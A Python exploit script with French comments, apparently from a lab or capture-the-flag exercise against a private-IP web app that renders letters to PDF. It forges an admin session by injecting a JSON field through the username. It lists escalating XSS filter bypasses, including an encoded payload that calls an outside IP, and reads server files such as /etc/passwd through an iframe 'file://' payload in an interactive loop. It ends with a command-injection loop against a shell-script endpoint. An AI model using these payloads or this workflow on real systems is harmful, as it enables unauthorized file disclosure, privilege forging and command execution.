import time
import requests
from flask.sessions import SecureCookieSessionInterface

port = 48361

session = requests.Session()
response = session.post("http://192.168.120.11:"+str(port)+"/", data={"username":'", "admin": 1, "yolo":"'})
print(session.cookies.get_dict())

def ReadFile(file, out):
    payload = "../etc/passwd" # pas une path traversal basique
    payload = "\input{/etc/passwd}" # pas une injection latex
    payload="ahah; ls -la" # pas une commande injection
    payload="ahah { / \\ ' \"" # pas de chars interprétés
    payload = "{{7*7}}" # pas une SSTI
    payload = '<u><b>ok</b></u>' # html interprété, donc XSS possible
    payload = '<script src=mdr">' # On dirait qu'il y a un filtre sur script
    payload = '<sCrIpT src=mdr">' # le filtre est en case insensitive
    payload='<button autofocus onfocus="mdr">' # Il y a aussi un filtre sur onfocus
    payload='<img src=x />' # img passe
    payload='<img src=x onload="mdr"/>' # Il y a aussi un filtre sur onload
    payload='<img src=x onerror="mdr"/>' # Il y a aussi un filtre sur onerror
    payload="<img src=javascript:document.write('mdr')>" # pas de filtre sur le src
    # je tente une xss qui me permettra de lire du fichier, passe pas
    payload="<img src=javascript:Function(String.fromCharCode(118,97,114,32,120,104,116,116,112,65,99,116,105,111,110,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,120,104,116,116,112,65,99,116,105,111,110,46,111,112,101,110,40,34,71,69,84,34,44,32,34,104,116,116,112,58,47,47,49,54,49,46,57,55,46,49,51,52,46,50,51,56,47,34,44,32,102,97,108,115,101,41,59,10,120,104,116,116,112,65,99,116,105,111,110,46,115,101,110,100,40,41,59))() />"
    payload="OK<annotation file=\"/var/www/index.js\" content=\"/var/www/index.js\"/>" # vuln vue sur IKEA pour download le fichier par la suite, passe pas
    payload="AH<object data=\"file:///"+file+"\" />" # le rendu est giga dégueulasse on voit pas tout le fichier
    payload="AH<iframe src=\"file:///"+file+"\" />" # perfecto
    response = session.get("http://192.168.120.11:"+str(port)+"/letters?namechild="+payload)
    print(response.text)


    f = open(out+".pdf", "wb")
    f.write(response.content)
    f.close()

#ReadFile("/var/www/index.js", "out")
#ReadFile("/var/www/sendletter.sh", "out2")
#ReadFile("/var/www/output", "output")
read = True
if read:
    while True:
        try:
            file = input("Enter file> ")
            ReadFile(file, "output")
        except Exception as ex:
            print(ex)
    
while True:
    try:
        payload = input("Enter payload> ")
        #payload = 'mel";'+payload+'; echo "do'
        print('-> /var/www/sendletter.sh "'+payload+'"')
        response = session.get("http://192.168.120.11:"+str(port)+"/sendletterstochildren?childname="+payload)
        print(response.text)
    except Exception as ex:
        print(ex)
